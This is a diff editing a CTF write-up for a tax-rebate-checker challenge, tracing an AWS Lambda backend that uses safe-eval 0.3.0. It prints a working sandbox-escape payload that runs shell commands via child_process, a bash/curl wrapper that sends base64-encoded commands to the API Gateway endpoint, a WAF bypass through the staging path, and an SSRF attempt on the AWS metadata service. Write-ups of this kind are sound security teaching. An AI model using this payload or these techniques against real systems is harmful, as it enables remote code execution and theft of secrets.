@@ -13,7 +13,7 @@ Unfortunately, it's not the most factually accurate or exciting page...
 
 _You can literally only type anything satisfying `([0-9e])+`._
 
-Clearly, the challenge does not intend for us to exploit the front-end of the website. So we have to exploit the back-end(duh).
+Clearly, the challenge does not intend for us to exploit the frontend of the website. So we have to exploit the backend.
 
 But to exploit the back-end, we need to find/leak the source code for any files or APIs. Where do we go to find such a thing?
 
@@ -33,12 +33,15 @@ Before we exploit the page, we must first **find** the exploit.
 
 ### Backend Reconnaissance
 
-To look for any API calls (We are using Chrome/Firefox), go to:
+A myriad of tools exist for tracing API calls:
 
-- (Chrome) "Developer Tools" -> "Network" tab 
-- (Firefox) idk @sheepymeh
+- Browsers "Developer Tools" -> "Network" tab (we chose this)
+- Wireshark
+- Fidder
+- Burpsuite  
+_etc._
 
-Send a bogus request like so:
+We can try using the API by tying filling in random values into the field:
 
 ![bogus request](bogus.png)
 
@@ -46,18 +49,20 @@ Et voilá!
 
 ![bogus response](bogus_resp.png)
 
-From this bogus request, we can see that the website sends a POST request to
+We can see that the website sends a POST request to
 
 ```
-https://cors-anywhere.herokuapp.com/ <- (this part is not important)
+https://cors-anywhere.herokuapp.com/
 
-https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker <- (this part is very important)
+https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker (actual API endpoint)
 ```
+
+CORS Anywhere is a service used to bypass the samesite policy. As the API Gateway URL does not return a CORS header on its own (no idea why it doesn't), this is needed to tell the browser that it's okay to send a request to this page.
 
 Immediately, we can deduce that:
 
-- The backend is hosted on [AWS](https://aws.amazon.com/api-gateway/)
-- [AWS Lambda](https://aws.amazon.com/lambda/) is the backend handler.
+- The backend is proxied behind [AWS Gateway](https://aws.amazon.com/api-gateway/)
+- [AWS Lambda](https://aws.amazon.com/lambda/) is a commonly used serverless service used in conjunction with AWS Gateway.
 
 ### Diving into Github
 
@@ -67,7 +72,8 @@ In grabbing information from Github, we found something really interesting:
 We now know that:
 
 - There is a vulnerable library being used.
-- If we change the API URL from 'prod' to 'staging', we can just circumvent WAF (to add: a more in-depth explanation of "what is WAF?")
+- If we change the API URL from 'prod' to 'staging', we can bypass WAF
+  - A WAF/Web Application Firewall is used to prevent attacks by filtering incoming requests. In this case, it seems to look for illegal characters that are required in order to perform this attack.
 
 As the application was running on Node.js, we can find the dependencies in `package.json`:
 
@@ -88,7 +94,7 @@ As the application was running on Node.js, we can find the dependencies in `pack
 }
 ```
 
-Despite it's name literally saying `safe`, we are pretty sure `c0v1d-agent-1` was talking about `safe-eval`.
+`safe-eval` is the only dependency listed, so we checked out its GitHub and NPM pages.
 
 Sure enough, `safe-eval 0.3.0` has a [critical vulnerability](https://github.com/hacksparrow/safe-eval/issues/5) to be exploited. (to add: explain what the person is doing. why does this bypass safe-eval?)
 
@@ -104,8 +110,9 @@ safeEval((new Buffer(body.age, 'base64')).toString('ascii') + " + " + (new Buffe
 
 This means that:
 
-- We have to put our payload in `body.age` (or else Node.js will screw up our exploit) (to add: can you show how it will screw up our exploit?) `
-_note that doing this the other way round (payload in salary) does not work syntactically. either a leading "+" will be present, or the eval will return the value of the sum instead_`
+- We have to put our payload in `body.age`, not the other way round
+  - We want `<payload> // + this stuff is all in a comment`
+  - If we put the payload in `salary`, the payload would be `<body.age> + <payload> //`, which would result in an error (if `<body.age> + <payload>` is invalid), or it would return the added value of the two
 - Whatever values for `body.age` and `body.salary` we have to pass in needs to be in base64.
 
 Hence, our payload wrapper would look like this:
@@ -127,26 +134,42 @@ _([skip to solution](#solution))_ (hmm, should this be here?)
 Now we are in the Lambda function, RCE in hand. However, no hints were given about where the flag was located.
 
 To avoid wasting time, we drew up a shell file to perform any command we wanted quickly:
+
 ```bash
-ste="(function (){delete this.constructor;const HostObject = this.constructor;const HostFunction = HostObject.is.constructor;const process = HostFunction('return process')();return process.mainModule.require('child_process').execSync('COMMAND').toString();})()//"
+cmd="(function(){delete this.constructor;const HostObject=this.constructor;const HostFunction=HostObject.is.constructor;const process=HostFunction('return process')();return process.mainModule.require('child_process').execSync('COMMAND').toString();})()//"
 
 echo -n "Command? "
 read rep
 
-wow=$(echo -n "${ste/COMMAND/$rep}" | base64 | tr -d " \t\n\r")
+payload=$(echo -n "${cmd/COMMAND/$rep}" | base64 | tr -d " \t\n\r")
 
-curl https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker --data '{"age":'\"$wow\"',"salary":"123"}' -H 'Content-Type: application/json'
+curl https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker --data '{"age":'\"$payload\"',"salary":"123"}' -H 'Content-Type: application/json'
 ```
+
+(basically we used a really bad non-interactive reverse shell, since Lambda functions time out quickly and we cannot use a normal reverse shell)
 
 Essentially all we did was:
 
-- Input any command we want (well... not [really](#Appendix-A) )
+- Input any command we want (well... [not really](#Appendix-A))
 
 First we suspected that the file might have been part of the Lambda deployment package. We knew that Lambda only allows [functions to write to `/tmp` (during execution)](https://forums.aws.amazon.com/thread.jspa?threadID=174119), and [Lambda Layers are written to `/opt`](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html). 
 
-When `ls` on these two directories did not succeed, we tried `ls -R` (recursive) on the root directory, but quickly hit the [default execution time limit of 3s](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html).
+When `ls` on these two directories did not succeed, we tried `ls -R` (recursive) on the root directory in desperation, but quickly hit the [default execution time limit of 3s](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html).
 
-Next, we tried to use SSRF to use the [metadata service](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/) available on AWS. (to be written)
+Next, we tried to use SSRF to use the [metadata service](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/) available on AWS. This meant that we were looking for some metadata about the Lambda function, or perhaps other functions available, or S3 buckets on the account. We tried to do this by editing the payload a little:
+
+```js
+// return process.mainModule.require('child_process').execSync('COMMAND').toString();
+const http = require('http');
+http.get('http://169.254.169.254', res => {
+  // do whatever
+})
+```
+But we faced a few problems quickly:
+1. It seems like the VM created by `safe-eval` does not have internet access. When we tried to ping a RequestBin, it did not show up.
+2. The asynchronous nature of the call made it really hard to return its value
+
+This convinced us that there was an easier way.
 
 ### Solution
 Finally, it hit us that environment variables existed. **GROUNDBREAKING DISCOVERY**.
@@ -170,27 +193,8 @@ flag=3nv_L0oK$-G$$D!
 govtech-csg{3nv_L0oK$-G$$D!}
 ```
 
-
-Not sure if you still need this.
-
-```
-$ curl -v http://z8ggp.tax-rebate-checker.cf/
-...
-< HTTP/1.1 200 OK
-< X-GUploader-UploadID: ABg5-UwbFLtFsPubVCx8sxKMuCR8qsX1ZzoCw8DiaG34sDXnnUs7YZ7T2c-MbLkoUOUn-ztbbri2R6ZYZ8zX_eL1hzc
-< x-goog-generation: 1606418262624802
-< x-goog-metageneration: 1
-< x-goog-stored-content-encoding: identity
-< x-goog-stored-content-length: 774
-< x-goog-hash: crc32c=mMvjHQ==
-< x-goog-hash: md5=wVoFqiGGeVXoDandOpY2SA==
-< x-goog-storage-class: STANDARD
-< Server: UploadServer
-...
-```
-
 ## Appendix A
-We initially tried a lot of commands like `find` etc. However, we noticed that they couldn't be found.
+We initially tried a lot of commands like `find`, `curl` etc. However, we noticed that they couldn't be found.
 
 Being curious and also rather intellectually challenged, we decided to look up all the commands with `ls /usr/bin`.
 
@@ -213,4 +217,6 @@ umask unalias uname unexpand uniq unlink update-ca-trust users
 vdir wait wc who whoami yes 
 ```
 
-**Interesting.**
+This is because the Lambda image is built to be tiny and quick to deploy, because these instances can be created and destroyed in a matter of minutes.
+
+To run other commands, they must be packaged with the function, put in a Lambda layer, or by using a [self-made container](https://aws.amazon.com/en/about-aws/whats-new/2020/12/aws-lambda-now-supports-container-images-as-a-packaging-format/).
